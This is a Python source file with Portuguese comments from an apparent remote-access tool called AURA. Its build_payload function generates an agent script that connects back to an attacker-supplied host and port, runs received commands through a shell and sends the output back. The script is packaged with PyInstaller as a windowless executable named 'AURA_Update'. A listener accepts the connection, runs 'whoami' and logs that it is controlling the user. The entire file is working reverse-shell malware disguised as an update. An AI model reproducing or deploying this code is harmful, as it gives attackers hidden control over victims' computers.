# AURA/core/remote_handler.py
import os
import socket
import subprocess

def build_payload(target_os, lhost, lport, base_dir):
    output_dir = os.path.join(base_dir, "payloads")
    os.makedirs(output_dir, exist_ok=True)
    
    # Código Python que será o agente
    raw_code = f"""
import socket, subprocess, os, platform, time
def agent():
    while True:
        try:
            s = socket.socket()
            s.connect(("{lhost}", {lport}))
            while True:
                data = s.recv(1024).decode()
                if not data or data.lower() == 'exit': break
                # Comando 'stress_test' customizado para o seu projeto
                if data.lower() == 'stress_test':
                    import webbrowser
                    for _ in range(5): webbrowser.open("https://www.youtube.com")
                    s.send(b"Stress test executado no alvo.")
                    continue
                proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                res = proc.stdout.read() + proc.stderr.read()
                s.send(res if res else b"Comando executado.")
            s.close()
        except: time.sleep(5) # Tenta reconectar se cair
if __name__ == "__main__": agent()
"""
    
    py_file = os.path.join(output_dir, "aura_agent.py")
    with open(py_file, "w") as f:
        f.write(raw_code)

    if target_os == "windows":
        # Se estiver no Linux, você precisa do PyInstaller instalado. 
        # Nota: Gerar .exe no Linux gera um binário Linux. 
        # Para gerar .exe real, o ideal é rodar esse comando em um Windows.
        # Mas vamos gerar o comando aqui:
        try:
            subprocess.run([
                "pyinstaller", "--noconsole", "--onefile", 
                "--distpath", output_dir, "--name", "AURA_Update", py_file
            ], capture_output=True)
            return os.path.join(output_dir, "AURA_Update.exe")
        except:
            return f"Agente Python gerado: {py_file} (Converta para .exe no Windows)"
    
    return py_file

def start_listener(port, page_ui):
    """Ouve a conexão vinda do alvo."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind(("0.0.0.0", int(port)))
        s.listen(1)
        
        conn, addr = s.accept()
        page_ui.log_output.append(f"<br><font color='#00ff00'><b>[AGENTE CONECTADO]</b> IP: {addr[0]}</font>")
        
        # Envia comando inicial de teste
        conn.send(b"whoami")
        user = conn.recv(1024).decode().strip()
        page_ui.log_output.append(f"<b>[SESSÃO]</b> Controlando usuário: {user}")
        page_ui.log_output.append("<br><b>[DICA]</b> Agora você pode enviar comandos via console.")
        
        # Aqui poderíamos criar um loop de comandos, mas para o MVP do TRF, 
        # você pode disparar o 'stress_test' direto:
        conn.send(b"stress_test")
        
    except Exception as e:
        page_ui.log_output.append(f"Erro no Listener: {e}")
